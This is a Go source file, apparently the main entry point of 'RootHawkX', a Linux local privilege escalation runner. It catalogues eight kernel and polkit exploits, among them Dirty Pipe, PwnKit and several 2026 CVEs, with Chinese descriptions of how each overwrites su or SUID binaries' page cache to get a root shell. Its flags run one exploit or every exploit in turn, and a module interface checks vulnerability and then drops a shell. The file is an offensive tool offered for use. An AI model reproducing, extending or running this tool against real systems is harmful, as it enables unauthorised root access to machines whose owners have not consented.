//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"roothawk/pkg/exploits/cve20213560"
	"roothawk/pkg/exploits/cve20214034"
	"roothawk/pkg/exploits/cve20220847"
	"roothawk/pkg/exploits/cve202631431"
	"roothawk/pkg/exploits/cve202643284"
	"roothawk/pkg/exploits/cve202646300"
	"roothawk/pkg/exploits/dirtydecrypt"
	"roothawk/pkg/exploits/pintheft"
	"roothawk/pkg/logger"
	"roothawk/pkg/state"
)

const version = "1.1.0"

type exploitDef struct {
	ID        string
	Aliases   []string
	Name      string
	RunName   string
	Component string
	Run       func(options runOptions) error
}

type runOptions struct {
	PKExecPath   string
	BackupPath   string
	RootExecPath string
	Verbose      bool
}

var catalog = []exploitDef{
	{
		ID:        "CVE-2026-31431",
		Aliases:   []string{"cve-2026-31431", "copyfail", "copy-fail", "copy fail"},
		Name:      "Copy Fail",
		RunName:   "CopyFail",
		Component: "Linux Kernel 本地提权，涉及 crypto / AF_ALG / algif_aead 相关逻辑问题。",
		Run: func(options runOptions) error {
			cve202631431.Run(options.BackupPath, options.RootExecPath)
			return nil
		},
	},
	{
		ID:        "CVE-2026-43284",
		Aliases:   []string{"cve-2026-43284", "cve-2026-43500", "dirty frag", "copyfail2", "copyfail-2"},
		Name:      "Dirty Frag，也有人叫 CopyFail2",
		RunName:   "Dirty Frag",
		Component: "Linux Kernel 本地提权，涉及 xfrm/esp、shared skb frags 等内核网络/数据包处理路径。",
		Run: func(options runOptions) error {
			return cve202643284.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2026-46300",
		Aliases:   []string{"cve-2026-46300", "fragnesia"},
		Name:      "Fragnesia",
		RunName:   "Fragnesia",
		Component: "Linux Kernel 本地提权，利用 XFRM ESP-in-TCP 子系统的逻辑bug，通过 page cache 覆写 /usr/bin/su 获取 root shell。",
		Run: func(options runOptions) error {
			return cve202646300.Run(options.Verbose)
		},
	},
	{
		ID:        "pintheft",
		Aliases:   []string{"pin-theft", "PinTheft"},
		Name:      "PinTheft",
		RunName:   "PinTheft",
		Component: "Linux Kernel 本地提权，利用 RDS zerocopy double-free + io_uring page cache overwrite，覆写 SUID 二进制页面缓存获取 root shell。",
		Run: func(options runOptions) error {
			return pintheft.Run(options.Verbose)
		},
	},
	{
		ID:        "dirtydecrypt",
		Aliases:   []string{"dirty-decrypt", "dirtycbc", "dirty-cbc", "DirtyDecrypt", "DirtyCBC"},
		Name:      "DirtyDecrypt / DirtyCBC",
		RunName:   "DirtyDecrypt",
		Component: "Linux Kernel 本地提权，利用 rxgk_decrypt_skb() 缺少 COW 保护导致 page cache 写入，覆写 SUID 二进制获取 root shell。",
		Run: func(options runOptions) error {
			return dirtydecrypt.Run(options.Verbose)
		},
	},
	{
		ID:        "CVE-2021-4034",
		Aliases:   []string{"cve-2021-4034", "pwnkit", "pkexec"},
		Name:      "PwnKit",
		RunName:   "PwnKit",
		Component: "Polkit 的 pkexec 本地提权漏洞。",
		Run: func(options runOptions) error {
			return cve20214034.Run(options.PKExecPath)
		},
	},
	{
		ID:        "CVE-2021-3560",
		Aliases:   []string{"cve-2021-3560", "polkit:CVE-2021-3560", "polkit dbus", "polkit authentication bypass"},
		Name:      "Polkit D-Bus 权限绕过 / Polkit Authentication Bypass",
		RunName:   "Polkit Authentication Bypass",
		Component: "Polkit 本地提权，可通过 D-Bus 请求绕过凭据检查，提升权限；没有像 PwnKit 那样特别统一的短名字。",
		Run: func(options runOptions) error {
			return runExploitModule(cve20213560.New())
		},
	},
	{
		ID:        "CVE-2022-0847",
		Aliases:   []string{"cve-2022-0847", "dirty pipe", "dirtypipe", "kernel:CVE-2022-0847"},
		Name:      "Dirty Pipe",
		RunName:   "Dirty Pipe",
		Component: "Linux Kernel 本地提权，管道机制相关漏洞。",
		Run: func(options runOptions) error {
			return runExploitModule(cve20220847.New())
		},
	},
}

func main() {
	var (
		showList         bool
		runAny           bool
		exploitName      string
		internalExploit  string
		pkexecPath       string
		copyFailBackup   string
		copyFailExecPath string
		verbose          bool
	)

	flag.BoolVar(&showList, "list", false, "list supported CVE exploit entries")
	flag.BoolVar(&runAny, "any", false, "execute every supported exploit in list order")
	flag.StringVar(&exploitName, "e", "", "execute one exploit by CVE name or alias")
	flag.StringVar(&internalExploit, "run-internal", "", "internal RootHawk worker mode")
	flag.StringVar(&pkexecPath, "pk", "/usr/bin/pkexec", "pkexec path for CVE-2021-4034")
	flag.StringVar(&copyFailBackup, "backup", "", "backup path for CVE-2026-31431 before overwriting su")
	flag.StringVar(&copyFailExecPath, "exec", "", "CVE-2026-31431: command path to run as root instead of spawning su")
	flag.BoolVar(&verbose, "v", false, "verbose output where supported")
	flag.Usage = printHelp
	flag.Parse()

	options := runOptions{
		PKExecPath:   pkexecPath,
		BackupPath:   copyFailBackup,
		RootExecPath: copyFailExecPath,
		Verbose:      verbose,
	}

	if internalExploit != "" {
		if err := runExploit(internalExploit, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			os.Exit(1)
		}
		return
	}

	banner()

	switch {
	case showList:
		printList()
	case exploitName != "":
		if err := runChild(exploitName, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			os.Exit(1)
		}
	case runAny:
		runAll(options)
	default:
		printHelp()
	}
}

func banner() {
	fmt.Println(cyan("   ____              __  __                __"))
	fmt.Println(cyan("  / __ \\____  ____  / /_/ /_  ____ __    / /__"))
	fmt.Println(cyan(" / /_/ / __ \\/ __ \\/ __/ __ \\/ __ `/ |  / / _ \\"))
	fmt.Println(cyan("/ _, _/ /_/ / /_/ / /_/ / / / /_/ /| |_/ /  __/"))
	fmt.Println(cyan("/_/ |_|\\____/\\____/\\__/_/ /_/\\__,_/ |___/\\___/"))
	fmt.Printf("%s %s\n\n", yellow("RootHawkX"), faint("Linux local privilege escalation runner v"+version))
}

func printHelp() {
	fmt.Println("Usage:")
	fmt.Println("  RootHawkX -list")
	fmt.Println("  RootHawkX -e <CVE-or-alias> [options]")
	fmt.Println("  RootHawkX -any [options]")
	fmt.Println()
	fmt.Println("Options:")
	fmt.Println("  -list              显示当前集成的 CVE")
	fmt.Println("  -e <name>          执行指定 CVE，例如 -e CVE-2022-0847")
	fmt.Println("  -any               按列表顺序执行全部漏洞")
	fmt.Println("  -pk <path>         CVE-2021-4034 的 pkexec 路径，默认 /usr/bin/pkexec")
	fmt.Println("  -backup <path>     CVE-2026-31431 执行前备份 su 到指定路径")
	fmt.Println("  -exec <path>       CVE-2026-31431 提权后执行指定程序，而不是进入 su")
	fmt.Println("  -v                 尽量输出详细日志")
	fmt.Println("  -help              显示帮助")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  RootHawkX -list")
	fmt.Println("  RootHawkX -e CVE-2022-0847")
	fmt.Println("  RootHawkX -e CVE-2026-31431 -backup /tmp/su.bak")
	fmt.Println("  RootHawkX -e CVE-2026-43284 -v")
	fmt.Println("  RootHawkX -any")
}

func printList() {
	fmt.Printf("%s\n", green("[+] RootHawkX supported CVEs"))
	for _, item := range catalog {
		fmt.Printf("\n  %s\n", red(item.ID))
		fmt.Printf("      %s %s\n", yellow("别名:"), cyan(item.Name))
		fmt.Printf("      %s %s\n", yellow("描述:"), item.Component)
	}
}

func runAll(options runOptions) {
	for _, item := range catalog {
		fmt.Printf("\n%s Running %s（%s）\n", cyan("[*]"), green(item.RunName), red(item.ID))
		if err := runChild(item.ID, options); err != nil {
			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
			continue
		}
		fmt.Printf("%s %s completed\n", green("[+]"), item.ID)
	}
}

func runChild(name string, options runOptions) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	args := []string{"-run-internal", name, "-pk", options.PKExecPath}
	if options.BackupPath != "" {
		args = append(args, "-backup", options.BackupPath)
	}
	if options.RootExecPath != "" {
		args = append(args, "-exec", options.RootExecPath)
	}
	if options.Verbose {
		args = append(args, "-v")
	}
	cmd := exec.Command(exe, args...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func runExploit(name string, options runOptions) error {
	item, ok := lookupExploit(name)
	if !ok {
		return fmt.Errorf("unknown exploit %q, use -list to see supported names", name)
	}
	fmt.Printf("%s Running %s（%s）\n", cyan("[*]"), green(item.RunName), red(item.ID))
	return item.Run(options)
}

func lookupExploit(name string) (exploitDef, bool) {
	needle := normalizeName(name)
	for _, item := range catalog {
		if normalizeName(item.ID) == needle || normalizeName(item.Name) == needle || normalizeName(item.RunName) == needle {
			return item, true
		}
		for _, alias := range item.Aliases {
			if normalizeName(alias) == needle {
				return item, true
			}
		}
	}
	return exploitDef{}, false
}

func normalizeName(name string) string {
	return strings.ToLower(strings.TrimSpace(name))
}

type moduleVulnerability interface {
	IsVulnerable(context.Context, *state.State, logger.Logger) bool
}

type moduleShellDropper interface {
	Shell(context.Context, *state.State, logger.Logger) error
}

func runExploitModule(v interface {
	moduleVulnerability
	moduleShellDropper
}) error {
	ctx := context.Background()
	log := logger.New()
	s := state.New()
	s.Assess()
	if !v.IsVulnerable(ctx, s, log) {
		return fmt.Errorf("target does not look vulnerable")
	}
	return v.Shell(ctx, s, log)
}

func cyan(s string) string   { return "\x1b[36m" + s + "\x1b[0m" }
func green(s string) string  { return "\x1b[32m" + s + "\x1b[0m" }
func yellow(s string) string { return "\x1b[33m" + s + "\x1b[0m" }
func red(s string) string    { return "\x1b[31m" + s + "\x1b[0m" }
func faint(s string) string  { return "\x1b[2m" + s + "\x1b[0m" }
